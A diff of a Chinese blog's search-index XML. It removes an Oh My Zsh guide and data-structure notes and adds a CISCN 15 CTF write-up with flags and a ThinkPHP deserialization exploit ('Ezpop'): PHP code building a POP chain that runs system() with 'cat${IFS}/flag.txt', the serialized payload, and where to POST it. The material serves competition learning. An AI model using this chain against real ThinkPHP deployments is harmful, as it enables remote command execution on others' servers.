-<h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p>
-<p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p>
-<p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p>
-<h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p>
-<ol>
-<li><p>自动更新，无确认提示：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>要完全禁用自动更新：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure>
-
-<p>魔法！🎉</p>
-<h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p>
-<p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p>
-<h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p>
-<blockquote>
-<p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>开源项目</category>
-      </categories>
-      <tags>
-        <tag>github</tag>
-        <tag>tools</tag>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Queue Structures</title>
     <url>/2021/05/29/queue-struct/</url>
     <content><![CDATA[<h3 id="队列（FIFO）"><a href="#队列（FIFO）" class="headerlink" title="队列（FIFO）"></a>队列（FIFO）</h3><ol>
@@ -3516,132 +3352,61 @@
       </tags>
   </entry>
   <entry>
-    <title>WHAT IS DATA STRUCTURE</title>
-    <url>/2021/05/29/whats-Data-Structure/</url>
-    <content><![CDATA[<h1 id="基本概念-amp-术语"><a href="#基本概念-amp-术语" class="headerlink" title="基本概念&amp;术语"></a>基本概念&amp;术语</h1><h2 id="1-数据"><a href="#1-数据" class="headerlink" title="1. 数据"></a>1. 数据</h2><p>   （描述客观事物的符号，能被计算机识别并操作的符号集合）</p>
+    <title>【WP】FIFTEENTH CISCN (PART)</title>
+    <url>/2022/05/29/ciscn15/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="4-调查问卷"><a href="#4-调查问卷" class="headerlink" title="4. 调查问卷"></a>4. 调查问卷</h2><img width="273" height="152" src="/img/ciscn15/clip_image006.png" v:shapes="图片_x0020_6">
+
+<img width="381" height="145" src="/img/ciscn15/clip_image008.png" v:shapes="图片_x0020_1">
+
 <ul>
-<li>性质：a.可以输入到计算机中。b.能被计算机程序处理。</li>
-<li>数值类型数据：进行数值计算（整型、实型）</li>
-<li>非数值类型数据：通过编码变成字符数据（字符型、声音、图像、视频等）</li>
+<li><strong>flag值：flag{Thanksforplayingourgames}</strong></li>
 </ul>
-<h2 id="2-数据元素（“记录”）"><a href="#2-数据元素（“记录”）" class="headerlink" title="2. 数据元素（“记录”）"></a>2. 数据元素（“记录”）</h2><p>组成数据的基本单位</p>
-<h2 id="3-数据项"><a href="#3-数据项" class="headerlink" title="3. 数据项"></a>3. 数据项</h2><p>若干数据项组成一个数据元素，是<span style="color: red;">数据不可分割的最小单位</span></p>
-<h2 id="4-数据对象"><a href="#4-数据对象" class="headerlink" title="4. 数据对象"></a>4. 数据对象</h2><p>数据的子集（相同性质的数据元素的集合）</p>
-<h2 id="5-数据结构"><a href="#5-数据结构" class="headerlink" title="5. 数据结构"></a>5. 数据<span style="color: red;">结构</span></h2><p>存在一种或多种<span style="color: red;">特定关系</span><strong>的数据元素的集合</strong></p>
-<h1 id="结构分类"><a href="#结构分类" class="headerlink" title="结构分类"></a>结构分类</h1><h2 id="1-存储类型"><a href="#1-存储类型" class="headerlink" title="1. 存储类型"></a>1. 存储类型</h2><ol>
-<li><h3 id="逻辑结构：-面向问题-数据元素之间的关系"><a href="#逻辑结构：-面向问题-数据元素之间的关系" class="headerlink" title="逻辑结构：(面向问题)数据元素之间的关系"></a>逻辑结构：<span style="color: green;">(面向问题)</span>数据元素之间的关系</h3><ol>
-<li><h4 id="线性结构：一对一"><a href="#线性结构：一对一" class="headerlink" title="线性结构：一对一"></a>线性结构：一对一</h4></li>
-<li><h4 id="非线性结构"><a href="#非线性结构" class="headerlink" title="非线性结构"></a>非线性结构</h4><ol>
-<li>集合结构：同属一个集合，没有其他关系（一国+多民族）</li>
-<li>树形结构：一对多、层次</li>
-<li>图形结构：多对多</li>
-</ol>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-签到电台"><a href="#1-签到电台" class="headerlink" title="1. 签到电台"></a>1. 签到电台</h2><p>此题与摩斯电码关系不大</p>
+<ol>
+<li><p>输入<code>···</code>启动后BurpSuit抓个包</p>
+</li>
+<li><p>可以直接进行url<code>?msg=xxxx</code>传递</p>
+</li>
+<li><p>前往公众号获取提示</p>
+<p> <img src="/img/ciscn15/791b051d1069024a94daeb6088ae9d85.png" alt="791b051d1069024a94daeb6088ae9d85.png"></p>
+</li>
+<li><p>按照网址提供的<strong>密码本</strong>前28位，与7个电码逐位相加mod10</p>
+<p> <img src="/img/ciscn15/11d9f4b5684c6db2c80405469cd555e7.png" alt="11d9f4b5684c6db2c80405469cd555e7.png"></p>
+</li>
+<li><p>回到repeater，得到flag</p>
+<p> <img src="/img/ciscn15/d371e53295e989db066669aa100f4d76.png" alt="d371e53295e989db066669aa100f4d76.png"></p>
 </li>
 </ol>
-</li>
-<li><h3 id="物理结构：-面向计算机-在计算机中的存储方式"><a href="#物理结构：-面向计算机-在计算机中的存储方式" class="headerlink" title="物理结构：(面向计算机)在计算机中的存储方式"></a>物理结构：<span style="color: green;">(面向计算机)</span>在计算机中的存储方式</h3><ol>
-<li>顺序存储结构（连续地址、排队占位）：数据间的<span style="color: blue;">逻辑关系</span>和<span style="color: blue;">物理关系</span>一致</li>
-<li>链式存储结构（指针索引、任意存储）</li>
-</ol>
-</li>
-</ol>
-<h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h2><ul>
-<li><p><span style="color: blue;">分类方式：</span> <span style="color: blue;"></p>
 <ul>
-<li>1. 取值范围</span> <span style="color: blue;"></li>
-<li>2. 所能进行的操作</span></li>
-</ul>
+<li><p><strong>flag：flag{2adc3f3c-0264-4bb5-bea4-fec4d788bb23}</strong></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4. Ezpop"></a>4. Ezpop</h2></li>
+<li><p>thinkphp 框架</p>
 </li>
 </ul>
 <ol>
-<li><p>原子类型（不可分解的基本类型）：整型、实型、字符型</p>
+<li><p>发现网址目录下有源码<code>/www.zip</code>，下载下来分析</p>
 </li>
-<li><p>结构类型（可分解组合类型）：结构体</p>
+<li><p>根据<code>/public/index.php</code>源码和注释提示构造 payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>抽象数据类型 ADT（微元思想）：一个<span style="color: red;">数学模型</span>及定义在该模型上的一组操作</p>
+<li><p>运行一下php代码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>POST方式提交到<code>/index.php/index/test</code>得到flag</p>
+<p> <img src="/img/ciscn15/09b19555a94fb43eed78855b59ef272c.png" alt="09b19555a94fb43eed78855b59ef272c.png"></p>
 </li>
 </ol>
+<ul>
+<li><strong>flag: flag{85d52d33-9e9b-42a7-9970-fbe62641acf3}</strong></li>
+</ul>
 ]]></content>
       <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Stack Structures</title>
-    <url>/2021/05/29/stack-struct/</url>
-    <content><![CDATA[<h3 id="栈（LIFO结构）"><a href="#栈（LIFO结构）" class="headerlink" title="栈（LIFO结构）"></a>栈（LIFO结构）</h3><ol>
-<li><h4 id="定义：仅在表尾（栈顶top）插入-amp-删除的后进先出-x3D-x3D-线性表-x3D-x3D"><a href="#定义：仅在表尾（栈顶top）插入-amp-删除的后进先出-x3D-x3D-线性表-x3D-x3D" class="headerlink" title="定义：仅在表尾（栈顶top）插入&amp;删除的后进先出&#x3D;&#x3D;线性表&#x3D;&#x3D;"></a>定义：仅在<strong>表尾</strong>（栈顶top）插入&amp;删除的后进先出&#x3D;&#x3D;线性表&#x3D;&#x3D;</h4><ol>
-<li>特点：线性表（栈元素具有线性关系，即前驱后继关系）、有栈顶top和栈底bottom、空栈</li>
-<li>入（压）栈、出（弹）栈</li>
-<li>进出栈变化形式：有位置限制，无时间限制</li>
-<li>栈抽象数据类型（Stack）：类似线性表（P78~P79）</li>
-</ol>
-</li>
-<li><h4 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h4><ol>
-<li><p>空栈：<code>top = -1；</code>【数组元素从0开始】</p>
-</li>
-<li><p>top：栈顶指针</p>
-</li>
-<li><p>StackSize：栈长度</p>
-</li>
-<li><p>top &lt; StackSize</p>
-</li>
-<li><p>栈结构定义</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data[MAXSIZE];    <span class="comment">//存放数据的数组</span></span><br><span class="line">    <span class="type">int</span> top;    <span class="comment">//初始化栈顶指针，一般为 int top=-1；</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>进栈操作Push</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断栈满</span></span><br><span class="line"><span class="comment">2. top++</span></span><br><span class="line"><span class="comment">3. 数据赋值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack *S,SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == MAXSIZE <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    S-&gt;top++;    <span class="comment">//2</span></span><br><span class="line">    S-&gt;data[S-&gt;top]=e;    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>出栈操作Pop</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断栈空</span></span><br><span class="line"><span class="comment">2. 取出栈顶元素e</span></span><br><span class="line"><span class="comment">3. 栈顶top--</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack *S,SElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    *e=S-&gt;data[S-&gt;top];    <span class="comment">//2</span></span><br><span class="line">    S-&gt;top--;    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> OK;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>共享栈（&#x3D;&#x3D;管道对接&#x3D;&#x3D;）【节约空间】</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">共享栈空间结构定义：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data[MAXSIZE];</span><br><span class="line">    <span class="type">int</span> top1,top2;</span><br><span class="line">&#125;SqDoubleStack;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">入栈Push：</span></span><br><span class="line"><span class="comment"> ++top1</span></span><br><span class="line"><span class="comment"> --top2</span></span><br><span class="line"><span class="comment"> 1. 判断栈满：top1 + 1==top2</span></span><br><span class="line"><span class="comment"> 2. 记录元素stackNumber判断 top1++ 或 top2--</span></span><br><span class="line"><span class="comment"> 3. 元素赋值 S-&gt;data[ ++S-&gt;top1 || --S-&gt;top2 ]=e；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqDoubleStack *S,SElemType e,<span class="type">int</span> stackNumber)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top1+<span class="number">1</span> == S-&gt;top2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StackNumber == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        S-&gt;data[++S-&gt;top1] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(stackNumber==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        S-&gt;data[--S-&gt;top2] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(栈顶元素)出栈Pop：</span></span><br><span class="line"><span class="comment">    top1--</span></span><br><span class="line"><span class="comment">    top2++</span></span><br><span class="line"><span class="comment">    1.记录元素stackNumber判断top1或top2</span></span><br><span class="line"><span class="comment">    2.异常判断栈空：</span></span><br><span class="line"><span class="comment">        top1 == -1</span></span><br><span class="line"><span class="comment">        top2 == MAXSIZE</span></span><br><span class="line"><span class="comment">    3.取出栈顶元素*e=S-&gt;data[S-&gt;top1-- || S-&gt;top2++]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqDoubleStack *S,SElemType *e,<span class="type">int</span> stackNumber)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(stackNumber == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top1==<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ERROR;    <span class="comment">//栈1空，异常</span></span><br><span class="line">        &#125;*e=S-&gt;data[S-&gt;top1--];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(stackNumber ==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top2==MAXSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            ERROR;    <span class="comment">//栈2空，异常</span></span><br><span class="line">        &#125;*e=S-&gt;data[S-&gt;top2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>堆栈溢出：缺乏栈满判断，持续入栈，超出MAXSIZE</p>
-</li>
-</ol>
-</li>
-<li><h4 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h4><ol>
-<li><p>特点：链栈不需要头结点（头指针和栈顶指针合二为一），由内存提供动态空间，不存在溢出问题，只存在系统崩溃死机问题</p>
-</li>
-<li><p>链栈结构定义</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">定义数据结点，由data+next组成</span></span><br><span class="line"><span class="comment">定义top指针，计数元素count</span></span><br><span class="line"><span class="comment">空链栈：top == NULL 时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data;    <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span>    <span class="comment">//后继</span></span><br><span class="line">&#125;StackNode,*LinkStackPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LinkStackPtr top;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">&#125;LinkStack;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>链栈进栈操作：动态生成结点s，赋值元素e，s-&gt;next指向当前top指针指向的结点；top指向新结点s作为新栈顶；计数++</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 动态申请内存空间生成链栈结点</span></span><br><span class="line"><span class="comment">2. 数据域赋值</span></span><br><span class="line"><span class="comment">3. next指向当前栈顶指针top指向的结点</span></span><br><span class="line"><span class="comment">4. 成为新栈顶</span></span><br><span class="line"><span class="comment">5. 链栈count++</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(LinkStack *S,SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStackPtr s=(LinkStackPtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));    <span class="comment">//动态生成结点</span></span><br><span class="line">    s-&gt;data=e;</span><br><span class="line">    s-&gt;next=S-&gt;top;</span><br><span class="line">    S-&gt;top=s;</span><br><span class="line">    S-&gt;count++;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>链栈出栈操作：取出栈顶结点给变量p，指针下移，释放p</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.生成指针变量p</span></span><br><span class="line"><span class="comment">2.异常判断，栈S是否存在</span></span><br><span class="line"><span class="comment">3.取出栈顶top的数据域data</span></span><br><span class="line"><span class="comment">4.p指向top结点</span></span><br><span class="line"><span class="comment">5.top的下移一位作为新top结点</span></span><br><span class="line"><span class="comment">6.释放p指向的结点原top</span></span><br><span class="line"><span class="comment">7.计数count--</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(LinkStack *S,SElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStackPtr p;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(StackEmpty(*S))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    *e=S-&gt;top-&gt;data;    <span class="comment">//3</span></span><br><span class="line">    p=S-&gt;top;    <span class="comment">//4</span></span><br><span class="line">    S-&gt;top=S-&gt;top-&gt;next;    <span class="comment">//5</span></span><br><span class="line">    <span class="built_in">free</span>(p);    <span class="comment">//6</span></span><br><span class="line">    S-&gt;count--;    <span class="comment">//7</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h4><ol>
-<li>递归<ol>
-<li>定义：把自己当函数调用（递归：选择结构；迭代：循环结构）（弊端：频繁调用函数，占内存）</li>
-<li>(递归)栈操作：递归调用阶段 –&gt; 压&#x2F;入栈；递归回退阶段 –&gt; 弹&#x2F;出栈</li>
-<li><span style="color: green;">实例：斐波那契数列（P86~88）</span></li>
-</ol>
-</li>
-<li>四则运算表达式求值（中缀+后缀）<ol>
-<li>括号成对出现，（遇左括号）左括号进栈，（遇右括号）将左括号出栈</li>
-<li>中缀表达式转后缀：栈用来进出运算的&#x3D;&#x3D;符号&#x3D;&#x3D;</li>
-<li>后缀表达式进行计算：栈用来进出运算的&#x3D;&#x3D;数字&#x3D;&#x3D;</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
+        <tag>网络空间安全</tag>
+        <tag>CTF</tag>
+        <tag>ciscn</tag>
       </tags>
   </entry>
   <entry>
@@ -3939,6 +3704,165 @@
       </tags>
   </entry>
   <entry>
+    <title>WHAT IS DATA STRUCTURE</title>
+    <url>/2021/05/29/whats-Data-Structure/</url>
+    <content><![CDATA[<h1 id="基本概念-amp-术语"><a href="#基本概念-amp-术语" class="headerlink" title="基本概念&amp;术语"></a>基本概念&amp;术语</h1><h2 id="1-数据"><a href="#1-数据" class="headerlink" title="1. 数据"></a>1. 数据</h2><p>   （描述客观事物的符号，能被计算机识别并操作的符号集合）</p>
+<ul>
+<li>性质：a.可以输入到计算机中。b.能被计算机程序处理。</li>
+<li>数值类型数据：进行数值计算（整型、实型）</li>
+<li>非数值类型数据：通过编码变成字符数据（字符型、声音、图像、视频等）</li>
+</ul>
+<h2 id="2-数据元素（“记录”）"><a href="#2-数据元素（“记录”）" class="headerlink" title="2. 数据元素（“记录”）"></a>2. 数据元素（“记录”）</h2><p>组成数据的基本单位</p>
+<h2 id="3-数据项"><a href="#3-数据项" class="headerlink" title="3. 数据项"></a>3. 数据项</h2><p>若干数据项组成一个数据元素，是<span style="color: red;">数据不可分割的最小单位</span></p>
+<h2 id="4-数据对象"><a href="#4-数据对象" class="headerlink" title="4. 数据对象"></a>4. 数据对象</h2><p>数据的子集（相同性质的数据元素的集合）</p>
+<h2 id="5-数据结构"><a href="#5-数据结构" class="headerlink" title="5. 数据结构"></a>5. 数据<span style="color: red;">结构</span></h2><p>存在一种或多种<span style="color: red;">特定关系</span><strong>的数据元素的集合</strong></p>
